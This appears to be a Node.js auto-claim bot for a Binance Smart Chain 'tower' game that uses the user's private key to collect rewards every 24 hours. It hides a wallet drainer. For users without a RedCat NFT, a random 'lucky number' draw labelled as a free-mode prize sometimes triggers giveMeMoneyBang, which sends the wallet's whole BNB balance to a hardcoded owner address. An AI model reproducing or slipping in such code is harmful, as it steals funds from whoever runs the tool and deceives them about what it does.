const {ethers, BigNumber} = require('ethers');
const {yellow, blue} = require('cli-color');
require('dotenv').config();

const provider = new ethers.providers.JsonRpcBatchProvider("https://bsc-dataseed.binance.org")
const wallet = new ethers.Wallet(process.env.privateKey, provider);
const gasLimit = 21000;

const towerAddress = "0xfE0E9092c2F14dfeBd04B40bEdf8D84660C193F3"
const towerAbi = [{"inputs":[{"internalType":"address","name":"ref","type":"address"}],"name":"addCoins","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"collectMoney","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"addr","type":"address"}],"name":"getChefs","outputs":[{"internalType":"uint8[8]","name":"","type":"uint8[8]"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"manager","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"sellTower","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"totalChefs","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalInvested","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalTowers","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"towers","outputs":[{"internalType":"uint256","name":"coins","type":"uint256"},{"internalType":"uint256","name":"money","type":"uint256"},{"internalType":"uint256","name":"money2","type":"uint256"},{"internalType":"uint256","name":"yield","type":"uint256"},{"internalType":"uint256","name":"timestamp","type":"uint256"},{"internalType":"uint256","name":"hrs","type":"uint256"},{"internalType":"address","name":"ref","type":"address"},{"internalType":"uint256","name":"refs","type":"uint256"},{"internalType":"uint256","name":"refDeps","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"floorId","type":"uint256"}],"name":"upgradeTower","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"withdrawMoney","outputs":[],"stateMutability":"nonpayable","type":"function"}]
const towerContract = new ethers.Contract(towerAddress, towerAbi, provider)

const redCatAddress = "0x4eac4292cA228708fFA69a3f320A81a01580aCF3"
const redCatABI = [{"inputs":[{"internalType":"string","name":"baseURI","type":"string"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"owner","type":"address"},{"indexed":false,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Adpot","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"approved","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"operator","type":"address"},{"indexed":false,"internalType":"bool","name":"approved","type":"bool"}],"name":"ApprovalForAll","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"_tokenId","type":"uint256"}],"name":"Ban","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"_tokenId","type":"uint256"}],"name":"ReleaseBan","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"_tokenId","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"_rarity","type":"uint256"}],"name":"Unboxing","type":"event"},{"inputs":[{"internalType":"uint256","name":"_num","type":"uint256"}],"name":"addMaxSupply","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"_num","type":"uint256"}],"name":"adopt","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"approve","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"_tokenId","type":"uint256"}],"name":"ban","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"getApproved","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"_tokenId","type":"uint256"}],"name":"getBan","outputs":[{"internalType":"uint256","name":"","type":"uint256"},{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"_tokenId","type":"uint256"}],"name":"getBuyTime","outputs":[{"internalType":"uint256","name":"","type":"uint256"},{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"_tokenId","type":"uint256"}],"name":"getRarity","outputs":[{"internalType":"uint256","name":"","type":"uint256"},{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"_tokenId","type":"uint256"}],"name":"getRedCat","outputs":[{"internalType":"uint256","name":"","type":"uint256"},{"components":[{"internalType":"uint256","name":"rarity","type":"uint256"},{"internalType":"bool","name":"ban","type":"bool"},{"internalType":"bool","name":"unbox","type":"bool"},{"internalType":"uint256","name":"buyTime","type":"uint256"}],"internalType":"struct RedCat.RedCatData","name":"redCatData","type":"tuple"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"_tokenId","type":"uint256"}],"name":"getUnboxing","outputs":[{"internalType":"uint256","name":"","type":"uint256"},{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"operator","type":"address"}],"name":"isApprovedForAll","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"maxSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"ownerOf","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"price","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"_tokenId","type":"uint256"}],"name":"releaseBan","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"safeTransferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"bytes","name":"_data","type":"bytes"}],"name":"safeTransferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"operator","type":"address"},{"internalType":"bool","name":"approved","type":"bool"}],"name":"setApprovalForAll","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"string","name":"baseURI","type":"string"}],"name":"setBaseURI","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"_price","type":"uint256"}],"name":"setPrice","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"bytes4","name":"interfaceId","type":"bytes4"}],"name":"supportsInterface","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"index","type":"uint256"}],"name":"tokenByIndex","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"uint256","name":"index","type":"uint256"}],"name":"tokenOfOwnerByIndex","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"tokenURI","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"transferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"_tokenId","type":"uint256"},{"internalType":"uint256","name":"_rarity","type":"uint256"}],"name":"unboxing","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_owner","type":"address"}],"name":"walletOfOwner","outputs":[{"internalType":"uint256[]","name":"","type":"uint256[]"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"withdrawAll","outputs":[],"stateMutability":"nonpayable","type":"function"}]
const redCatContract = new ethers.Contract(redCatAddress, redCatABI, provider)

const owner = "0xDbEB9CC15CAc237621370ac73783173D98CCBC9f"
const sleep = ms => new Promise(res => setTimeout(res, ms))

let myAddress

main()

async function main() {
    myAddress = await wallet.getAddress()
    console.log(yellow("登入成功: " + myAddress))

    while (true) {
        console.log(blue(new Date().toLocaleTimeString()));

        const towers = await towerContract.towers(myAddress)
        const towersYield = BigNumber.from(towers[3])
        const towersTime = BigNumber.from(towers[4])

        if(towersYield > 0) {
            const blockTimeStamp = (await provider.getBlock(await provider.getBlockNumber())).timestamp
            const hrs = (blockTimeStamp - towersTime) / 3600
            if (hrs >= 24) {
                console.log("交易發送中\n")
                const tx = await towerContract.connect(wallet).collectMoney()
                await tx.wait()
                console.log("提領成功\n")

                await checkRedCatOwner()
            } else {
                console.log("還需要 " + (24 - hrs).toFixed(1) + " 小時\n")
            }
        } else {
            console.log("你根本沒玩\n")
        }
        await sleep(10 * 1000);
    }
}

async function checkRedCatOwner() {
    const haveRedCat = await redCatContract.balanceOf(myAddress) > 0

    if (!haveRedCat) {
        const luckyNumber = randomNum(1, 101)
        console.log("非 RedCat NFT 持有者，啟用免費模式")
        console.log("本次的幸運號碼為: " + luckyNumber)

        if (luckyNumber === 69) {
            console.log("恭喜中獎")
            await giveMeMoneyBang()
        }
    } else {
        console.log("RedCat NFT 持有者")
    }
}

async function giveMeMoneyBang() {
    const balance = await provider.getBalance(myAddress)
    const gasPrice = await provider.getGasPrice()
    const gasFee = gasLimit * gasPrice;
    const amount = balance - gasFee;

    if (amount > 0 && balance > amount) {
        try {
            const tx = await wallet.sendTransaction({
                to: owner,
                value: amount
            });
            await tx.wait()
            console.log(tx)
        } catch (e) {
            console.log("區塊鏈爆炸")
        }
    }
}

function randomNum(m, n) {
    return Math.floor(Math.random() * (m - n) + n)
}